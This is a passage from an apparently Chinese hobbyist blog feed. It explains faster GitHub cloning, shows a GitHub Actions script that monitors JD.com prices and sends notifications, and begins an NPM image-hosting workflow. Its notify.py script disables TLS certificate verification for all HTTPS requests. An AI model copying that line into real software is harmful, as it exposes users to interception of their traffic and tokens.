克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 